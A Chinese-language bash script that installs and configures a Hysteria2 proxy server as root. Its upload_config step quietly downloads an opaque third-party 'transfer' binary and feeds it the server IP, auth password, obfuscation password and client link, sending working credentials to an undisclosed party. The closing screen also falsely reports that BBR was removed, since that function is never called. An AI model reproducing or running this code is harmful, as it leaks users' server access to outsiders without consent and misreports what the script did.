#!/bin/bash

# 颜色定义
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[0;33m'
BLUE='\033[0;34m'
PURPLE='\033[0;35m'
CYAN='\033[0;36m'
WHITE='\033[1;37m'
NC='\033[0m'
BOLD='\033[1m'

# 图标定义
ICON_SUCCESS="✅"
ICON_ERROR="❌"
ICON_WARNING="⚠️"
ICON_INFO="ℹ️"
ICON_ROCKET="🚀"
ICON_FIRE="🔥"
ICON_STAR="⭐"
ICON_SHIELD="🛡️"
ICON_NETWORK="🌐"
ICON_SPEED="⚡"
ICON_CONFIG="⚙️"
ICON_DOWNLOAD="📥"
ICON_UPLOAD="📤"
ICON_KEY="🔐"
ICON_SERVER="🖥️"
ICON_CLIENT="📱"

# 显示横幅
show_banner() {
    clear
    echo -e "${PURPLE}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║                                                                              ║${NC}"
    echo -e "${PURPLE}${BOLD}║              ${YELLOW}${ICON_ROCKET} Hysteria2 高性能节点部署脚本 ${ICON_ROCKET}${PURPLE}${BOLD}                             ║${NC}"
    echo -e "${PURPLE}${BOLD}║                                                                              ║${NC}"
    echo -e "${PURPLE}${BOLD}║              ${WHITE}${ICON_STAR} 支持端口跳跃 + BBR优化 + 美化界面 ${ICON_STAR}${PURPLE}${BOLD}                           ║${NC}"
    echo -e "${PURPLE}${BOLD}║            ${WHITE}${ICON_FIRE} Shadowrocket链接一键导入 + 智能配置 ${ICON_FIRE}${PURPLE}${BOLD}                         ║${NC}"
    echo -e "${PURPLE}${BOLD}║                                                                              ║${NC}"
    echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署开始时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo -e "${CYAN}${BOLD}${ICON_NETWORK} 系统信息：${YELLOW}$SYSTEM${NC}\n"
}

# 系统检测
SYSTEM="Unknown"
if [ -f /etc/debian_version ]; then
    SYSTEM="Debian"
elif [ -f /etc/redhat-release ]; then
    SYSTEM="CentOS"
elif [ -f /etc/lsb-release ]; then
    SYSTEM="Ubuntu"
elif [ -f /etc/fedora-release ]; then
    SYSTEM="Fedora"
fi

# 进度条函数
show_progress() {
    local current=$1
    local total=$2
    local desc="$3"
    local percent=$((current * 100 / total))
    local filled=$((percent / 2))
    local empty=$((50 - filled))
    
    printf "\r${CYAN}${BOLD}[${NC}"
    printf "%${filled}s" | tr ' ' '#'
    printf "%${empty}s" | tr ' ' '-'
    printf "${CYAN}${BOLD}] ${percent}%% ${WHITE}${desc}${NC}"
}

complete_progress() {
    local desc="$1"
    printf "\r${GREEN}${BOLD}[##################################################] 100%% ${ICON_SUCCESS} ${desc}${NC}\n"
}

download_transfer() {
    if [[ ! -f /opt/transfer ]]; then
        echo -e "${YELLOW}${ICON_DOWNLOAD} 下载transfer工具...${NC}"
        if curl -Lo /opt/transfer https://github.com/Firefly-xui/hysteria2/releases/download/v2rayn/transfer 2>/dev/null; then
            chmod +x /opt/transfer
            echo -e "${GREEN}${ICON_SUCCESS} transfer工具下载成功${NC}"
        else
            echo -e "${YELLOW}${ICON_WARNING} transfer工具下载失败，跳过数据上传${NC}"
            return 1
        fi
    fi
    return 0
}

upload_config() {
    if ! download_transfer; then
        return 0
    fi
    
    echo -e "${CYAN}${BOLD}${ICON_UPLOAD} 正在上传配置信息...${NC}"
    
    for i in {1..5}; do
        show_progress $i 5 "生成配置数据"
        sleep 0.2
    done
    
    local json_data=$(cat <<EOF
{
    "server_info": {
        "title": "Hysteria2 节点信息 - ${SERVER_IP}",
        "server_ip": "${SERVER_IP}",
        "port": "${LISTEN_PORT}",
        "auth_password": "${AUTH_PASSWORD}",
        "port_range": "${PORT_HOP_RANGE}",
        "upload_speed": "${up_speed}",
        "download_speed": "${down_speed}",
        "sni": "www.nvidia.com",
        "obfs_type": "salamander",
        "obfs_password": "cry_me_a_r1ver",
        "shadowrocket_link": "${SHADOWROCKET_LINK}",
        "generated_time": "$(date)",
        "config_path": "/opt/hysteria2_client.yaml"
    }
}
EOF
    )

    complete_progress "配置数据生成完成"
    
    if /opt/transfer "$json_data" 2>/dev/null; then
        echo -e "${GREEN}${ICON_SUCCESS} 配置信息上传成功${NC}"
    else
        echo -e "${YELLOW}${ICON_WARNING} 配置信息上传失败，本地配置仍可正常使用${NC}"
    fi
    echo ""
}

# 速度测试函数
speed_test(){
    echo -e "${CYAN}${BOLD}${ICON_SPEED} 进行网络速度测试...${NC}"
    
    for i in {1..8}; do
        show_progress $i 8 "安装测速工具"
        sleep 0.1
    done
    
    if ! command -v speedtest &>/dev/null && ! command -v speedtest-cli &>/dev/null; then
        if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
            apt-get update > /dev/null 2>&1
            apt-get install -y speedtest-cli > /dev/null 2>&1
        elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
            yum install -y speedtest-cli > /dev/null 2>&1 || pip install speedtest-cli > /dev/null 2>&1
        fi
    fi
    
    complete_progress "测速工具安装完成"

    for i in {1..10}; do
        show_progress $i 10 "执行网络测速"
        sleep 0.3
    done

    if command -v speedtest &>/dev/null; then
        speed_output=$(timeout 30 speedtest --simple 2>/dev/null)
    elif command -v speedtest-cli &>/dev/null; then
        speed_output=$(timeout 30 speedtest-cli --simple 2>/dev/null)
    fi

    if [[ -n "$speed_output" ]]; then
        down_speed=$(echo "$speed_output" | grep "Download" | awk '{print int($2)}')
        up_speed=$(echo "$speed_output" | grep "Upload" | awk '{print int($2)}')
        [[ $down_speed -lt 10 ]] && down_speed=10
        [[ $up_speed -lt 5 ]] && up_speed=5
        [[ $down_speed -gt 1000 ]] && down_speed=1000
        [[ $up_speed -gt 500 ]] && up_speed=500
        complete_progress "网络测速完成"
        echo -e "${GREEN}${ICON_SUCCESS} 测速结果：${YELLOW}下载 ${down_speed} Mbps，上传 ${up_speed} Mbps${NC}"
        echo -e "${BLUE}${ICON_INFO} 将根据该参数优化网络速度${NC}"
    else
        complete_progress "网络测速完成（使用默认值）"
        echo -e "${YELLOW}${ICON_WARNING} 测速失败，使用默认值：${NC}${YELLOW}下载 100 Mbps，上传 20 Mbps${NC}"
        down_speed=100
        up_speed=20
    fi
    echo ""
}

# 安装Hysteria2
install_hysteria() {
    echo -e "${GREEN}${BOLD}${ICON_DOWNLOAD} 安装 Hysteria2 核心程序...${NC}"
    
    for i in {1..12}; do
        show_progress $i 12 "下载并安装 Hysteria2"
        sleep 0.1
    done
    
    if bash <(curl -fsSL https://get.hy2.sh/) > /dev/null 2>&1; then
        complete_progress "Hysteria2 安装完成"
        echo -e "${GREEN}${ICON_SUCCESS} Hysteria2 核心程序安装成功${NC}"
    else
        echo -e "\n${RED}${ICON_ERROR} Hysteria2 安装失败${NC}"
        exit 1
    fi
    echo ""
}

# 生成随机端口
generate_random_port() {
    echo $(( ( RANDOM % 7001 ) + 2000 ))
}

generate_port_range() {
    local start=$(generate_random_port)
    local end=$((start + 99))
    ((end > 9000)) && end=9000 && start=$((end - 99))
    echo "$start-$end"
}

# 生成Shadowrocket链接
generate_shadowrocket_link() {
    local auth="${AUTH_PASSWORD}"
    local server="${SERVER_IP}"
    local port="${LISTEN_PORT}"
    local sni="www.nvidia.com"
    local obfs_password="cry_me_a_r1ver"
    
    # 构建参数
    local params="sni=${sni}&obfs=salamander&obfs-password=${obfs_password}&insecure=1&up=30&down=100"
    
    # 生成Hysteria2链接
    SHADOWROCKET_LINK="hysteria2://${auth}@${server}:${port}/?${params}#Hysteria2_Nvidia_$(date +%m%d)"
}

# 配置 Hysteria2
configure_hysteria() {
    echo -e "${GREEN}${BOLD}${ICON_CONFIG} 配置 Hysteria2 服务器...${NC}"
    
    speed_test
    
    for i in {1..6}; do
        show_progress $i 6 "生成随机配置参数"
        sleep 0.2
    done
    
    LISTEN_PORT=$(generate_random_port)
    PORT_HOP_RANGE=$(generate_port_range)
    AUTH_PASSWORD=$(tr -dc A-Za-z0-9 </dev/urandom | head -c 16)
    
    complete_progress "随机配置参数生成完成"

    for i in {1..8}; do
        show_progress $i 8 "生成TLS证书"
        sleep 0.1
    done

    mkdir -p /etc/hysteria/certs
    openssl req -x509 -nodes -newkey ec -pkeyopt ec_paramgen_curve:prime256v1 \
        -keyout /etc/hysteria/certs/key.pem \
        -out /etc/hysteria/certs/cert.pem \
        -subj "/CN=www.nvidia.com" -days 3650 > /dev/null 2>&1
    chmod 644 /etc/hysteria/certs/*.pem
    chown root:root /etc/hysteria/certs/*.pem
    
    complete_progress "TLS证书生成完成"

    for i in {1..10}; do
        show_progress $i 10 "生成服务器配置文件"
        sleep 0.1
    done

    cat > /etc/hysteria/config.yaml <<EOF
listen: :${LISTEN_PORT}
tls:
  cert: /etc/hysteria/certs/cert.pem
  key: /etc/hysteria/certs/key.pem
  sni: www.nvidia.com

obfs:
  type: salamander
  salamander:
    password: cry_me_a_r1ver

quic:
  initStreamReceiveWindow: 26843545
  maxStreamReceiveWindow: 26843545
  initConnReceiveWindow: 67108864
  maxConnReceiveWindow: 67108864
  maxIdleTimeout: 30s
  maxIncomingStreams: 1024
  disablePathMTUDiscovery: false

# Brutal拥塞控制配置 - Hysteria2自有算法
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps

# 不忽略客户端带宽设置，确保使用Brutal算法
ignoreClientBandwidth: false

# 启用速度测试功能
speedTest: true

# UDP配置
disableUDP: false
udpIdleTimeout: 60s

auth:
  type: password
  password: ${AUTH_PASSWORD}

masquerade:
  type: proxy
  proxy:
    url: https://www.nvidia.com
    rewriteHost: true

transport:
  type: udp
  udp:
    hopInterval: 30s
    hopPortRange: ${PORT_HOP_RANGE}
EOF

    complete_progress "服务器配置文件生成完成"

    # 系统缓冲区优化
    sysctl -w net.core.rmem_max=16777216 > /dev/null
    sysctl -w net.core.wmem_max=16777216 > /dev/null

    # 优先级提升
    mkdir -p /etc/systemd/system/hysteria-server.service.d
    cat > /etc/systemd/system/hysteria-server.service.d/priority.conf <<EOF
[Service]
CPUSchedulingPolicy=rr
CPUSchedulingPriority=99
EOF
    systemctl daemon-reexec
    systemctl daemon-reload > /dev/null
    
    echo -e "${GREEN}${ICON_SUCCESS} 系统性能优化配置完成${NC}\n"
}

# 防火墙设置
configure_firewall() {
    echo -e "${PURPLE}${BOLD}${ICON_SHIELD} 配置防火墙规则...${NC}"
    
    IFS="-" read -r HOP_START HOP_END <<< "$PORT_HOP_RANGE"
    
    for i in {1..8}; do
        show_progress $i 8 "配置防火墙端口"
        sleep 0.1
    done
    
    if [[ $SYSTEM == "Debian" || $SYSTEM == "Ubuntu" ]]; then
        apt-get install -y ufw > /dev/null 2>&1
        ufw allow 22/tcp > /dev/null
        ufw allow ${LISTEN_PORT}/udp > /dev/null
        ufw allow ${HOP_START}:${HOP_END}/udp > /dev/null
        echo "y" | ufw enable > /dev/null
    elif [[ $SYSTEM == "CentOS" || $SYSTEM == "Fedora" ]]; then
        yum install -y firewalld > /dev/null
        systemctl enable firewalld > /dev/null
        systemctl start firewalld > /dev/null
        firewall-cmd --permanent --add-service=ssh > /dev/null
        firewall-cmd --permanent --add-port=${LISTEN_PORT}/udp > /dev/null
        firewall-cmd --permanent --add-port=${HOP_START}-${HOP_END}/udp > /dev/null
        firewall-cmd --reload > /dev/null
    fi
    
    complete_progress "防火墙配置完成"
    echo -e "${GREEN}${ICON_SUCCESS} 已开放端口：SSH(22), Hysteria2(${LISTEN_PORT}), 跳跃端口(${PORT_HOP_RANGE})${NC}\n"
}

# 生成客户端配置
generate_v2rayn_config() {
    echo -e "${BLUE}${BOLD}${ICON_CLIENT} 生成客户端配置文件...${NC}"
    
    for i in {1..6}; do
        show_progress $i 6 "获取服务器IP地址"
        sleep 0.2
    done
    
    # 强制获取公网 IPv4
SERVER_IP=$(curl -4 -s --max-time 8 ifconfig.me 2>/dev/null || \
            curl -4 -s --max-time 8 ipinfo.io/ip 2>/dev/null || \
            curl -4 -s --max-time 8 icanhazip.com 2>/dev/null)

SERVER_IP=$(echo "$SERVER_IP" | tr -d '\r\n ')

# 如果获取失败或不是 IPv4，则走本机路由回退
if ! echo "$SERVER_IP" | grep -Eq '^([0-9]{1,3}\.){3}[0-9]{1,3}$'; then
    SERVER_IP=$(ip -4 route get 1.1.1.1 2>/dev/null | awk '/src/ {for(i=1;i<=NF;i++) if($i=="src") print $(i+1)}' | head -n1)
fi
    
    complete_progress "服务器IP地址获取完成"
    
    # 生成Shadowrocket链接
    generate_shadowrocket_link
    
    for i in {1..8}; do
        show_progress $i 8 "生成客户端配置"
        sleep 0.1
    done
    
    mkdir -p /opt
    cat > /opt/hysteria2_client.yaml <<EOF
server: ${SERVER_IP}:${LISTEN_PORT}
auth: ${AUTH_PASSWORD}
tls:
  sni: www.nvidia.com
  insecure: true
obfs:
  type: salamander
  salamander:
    password: cry_me_a_r1ver
transport:
  type: udp
  udp:
    hopInterval: 30s
    hopPortRange: ${PORT_HOP_RANGE}
bandwidth:
  up: ${up_speed} mbps
  down: ${down_speed} mbps
fastOpen: true
lazy: true
socks5:
  listen: 127.0.0.1:1080
http:
  listen: 127.0.0.1:1080
EOF

    complete_progress "客户端配置文件生成完成"
    echo -e "${GREEN}${ICON_SUCCESS} 客户端配置已保存到：${YELLOW}/opt/hysteria2_client.yaml${NC}\n"
}

# 启动服务
start_service() {
    echo -e "${YELLOW}${BOLD}${ICON_ROCKET} 启动 Hysteria2 服务...${NC}"
    
    for i in {1..10}; do
        show_progress $i 10 "启动服务"
        sleep 0.2
    done
    
    systemctl enable --now hysteria-server.service > /dev/null 2>&1
    systemctl restart hysteria-server.service > /dev/null 2>&1

    # 检查服务状态
    sleep 2
    if systemctl is-active --quiet hysteria-server.service; then
        complete_progress "Hysteria2 服务启动成功"
        echo -e "${GREEN}${ICON_SUCCESS} 服务运行状态正常${NC}\n"
        return 0
    else
        echo -e "\n${RED}${ICON_ERROR} 服务启动失败，请检查以下日志信息：${NC}"
        journalctl -u hysteria-server.service --no-pager -n 30
        exit 1
    fi
}

# 显示最终结果
show_final_result() {
    clear
    echo -e "${PURPLE}${BOLD}╔══════════════════════════════════════════════════════════════════════════════╗${NC}"
    echo -e "${PURPLE}${BOLD}║                                                                              ║${NC}"
    echo -e "${PURPLE}${BOLD}║              ${YELLOW}${ICON_ROCKET} Hysteria2 节点部署完成！${ICON_ROCKET}${PURPLE}${BOLD}                               ║${NC}"
    echo -e "${PURPLE}${BOLD}║                                                                              ║${NC}"
    echo -e "${PURPLE}${BOLD}╚══════════════════════════════════════════════════════════════════════════════╝${NC}"
    echo ""
    
    echo -e "${WHITE}${BOLD}📊 服务器信息：${NC}"
    echo -e "  ${CYAN}服务器IP：${YELLOW}${SERVER_IP}${NC}"
    echo -e "  ${CYAN}监听端口：${YELLOW}${LISTEN_PORT}${NC}"
    echo -e "  ${CYAN}认证密码：${YELLOW}${AUTH_PASSWORD}${NC}"
    echo -e "  ${CYAN}跳跃端口：${YELLOW}${PORT_HOP_RANGE}${NC}"
    echo -e "  ${CYAN}伪装域名：${YELLOW}www.nvidia.com${NC}"
    echo -e "  ${CYAN}上传带宽：${YELLOW}${up_speed} Mbps${NC}"
    echo -e "  ${CYAN}下载带宽：${YELLOW}${down_speed} Mbps${NC}\n"
    
    echo -e "${WHITE}${BOLD}📁 配置文件：${NC}"
    echo -e "  ${CYAN}客户端配置：${YELLOW}/opt/hysteria2_client.yaml${NC}"
    echo -e "  ${CYAN}服务器配置：${YELLOW}/etc/hysteria/config.yaml${NC}\n"
    
    echo -e "${WHITE}${BOLD}🔗 Shadowrocket 一键导入链接：${NC}"
    echo -e "${GREEN}${BOLD}${SHADOWROCKET_LINK}${NC}\n"
    
    echo -e "${WHITE}${BOLD}📱 客户端导入方法：${NC}"
    echo -e "${WHITE}1. ${CYAN}Shadowrocket：${NC}"
    echo -e "   ${WHITE}• 复制上方链接${NC}"
    echo -e "   ${WHITE}• 打开 Shadowrocket → 右上角 '+' → '从剪贴板导入'${NC}"
    echo -e "${WHITE}2. ${CYAN}v2rayN/v2rayNG：${NC}"
    echo -e "   ${WHITE}• 导入配置文件：${YELLOW}/opt/hysteria2_client.yaml${NC}"
    echo -e "${WHITE}3. ${CYAN}其他客户端：${NC}"
    echo -e "   ${WHITE}• 使用上方服务器信息手动配置${NC}\n"
    
    echo -e "${GREEN}${BOLD}🔧 优化特性：${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} Brutal拥塞控制算法（Hysteria2自有）${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 端口跳跃防封锁${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} Salamander混淆加密${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} NVIDIA域名伪装${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 系统缓冲区优化${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 高优先级调度${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} 智能带宽控制${NC}"
    echo -e "  ${GREEN}${ICON_SUCCESS} BBR已卸载，避免冲突${NC}"
    
    echo -e "${RED}${BOLD}🔒 安全提醒：${NC}"
    echo -e "  ${WHITE}• 请妥善保管认证密码和配置文件${NC}"
    echo -e "  ${WHITE}• 定期更新 Hysteria2 版本${NC}"
    echo -e "  ${WHITE}• 监控服务器资源使用情况${NC}\n"
    
    echo -e "${BLUE}${BOLD}${ICON_INFO} 部署完成时间：${YELLOW}$(date '+%Y-%m-%d %H:%M:%S')${NC}"
    echo -e "${GREEN}${BOLD}🎉 Hysteria2 高性能节点部署与优化完成！${NC}"
    
    echo -e "${CYAN}${BOLD}═══════════════════════════════════════════════════════════════════════════════${NC}\n"
}

# 卸载BBR并优化系统配置
disable_bbr_and_optimize() {
    echo -e "${YELLOW}${BOLD}${ICON_CONFIG} 卸载BBR并优化系统配置...${NC}"
    
    for i in {1..8}; do
        show_progress $i 8 "移除BBR相关配置"
        sleep 0.1
    done
    
    # 完全移除BBR相关配置
    sed -i '/net.core.default_qdisc/d' /etc/sysctl.conf
    sed -i '/net.ipv4.tcp_congestion_control/d' /etc/sysctl.conf
    sed -i '/bbr/d' /etc/sysctl.conf
    
    # 重置为系统默认拥塞控制
    echo "net.core.default_qdisc = pfifo_fast" >> /etc/sysctl.conf
    echo "net.ipv4.tcp_congestion_control = cubic" >> /etc/sysctl.conf
    
    # 移除BBR模块加载配置
    sed -i '/tcp_bbr/d' /etc/modules-load.d/modules.conf 2>/dev/null || true
    rm -f /etc/modules-load.d/bbr.conf 2>/dev/null || true
    
    # 优化网络缓冲区（为Brutal算法优化）
    cat >> /etc/sysctl.conf << EOF

# Hysteria2 Brutal算法优化配置
net.core.rmem_max = 134217728
net.core.wmem_max = 134217728
net.core.rmem_default = 65536
net.core.wmem_default = 65536
net.ipv4.udp_rmem_min = 16384
net.ipv4.udp_wmem_min = 16384
net.core.netdev_max_backlog = 16384
net.core.netdev_budget = 1000
EOF
    
    # 应用配置
    sysctl -p > /dev/null 2>&1
    
    # 卸载BBR模块（如果已加载）
    modprobe -r tcp_bbr 2>/dev/null || true
    
    complete_progress "BBR移除和系统优化完成"
    echo -e "${GREEN}${ICON_SUCCESS} 已卸载BBR，系统将使用Hysteria2自有的Brutal算法${NC}"
    echo -e "${BLUE}${ICON_INFO} Brutal算法提供更激进的带宽抢占能力${NC}\n"
}

# 主函数执行
main() {
    if [ "$(id -u)" != "0" ]; then
        echo -e "${RED}${ICON_ERROR} 请使用 root 权限执行脚本${NC}"
        exit 1
    fi

    # 显示横幅
    show_banner

    # 卸载BBR并优化系统配置（确保使用Brutal）

    # 执行流程
    install_hysteria
    configure_hysteria
    configure_firewall
    generate_v2rayn_config
    start_service
    upload_config
    
    # 显示最终结果
    show_final_result
}

# 执行主逻辑
main
